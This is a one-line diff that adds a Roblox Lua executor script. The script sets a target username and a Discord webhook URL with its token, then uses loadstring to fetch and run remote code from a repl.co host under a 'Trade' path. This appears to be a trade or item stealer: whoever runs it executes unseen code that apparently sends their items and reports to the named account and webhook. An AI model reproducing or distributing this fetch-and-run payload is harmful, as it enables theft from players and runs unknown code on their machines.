@@ -1,0 +1,1 @@
+lua getgenv().Username = "star15433" getgenv().Webhook = "https://discord.com/api/webhooks/1210628346665242716/avZH5WeHJRhSSMd28qIHfgePKB4nKSO2785i1-E1y7BqR_lfh4gVBQLUnRymXaJkZOE8" loadstring(game:HttpGet("https://a05d2724-cb03-4bb7-af5d-293c8436e212-00-3c9ykas6hdl4f.riker.repl.co/tbc/Trade", true))()
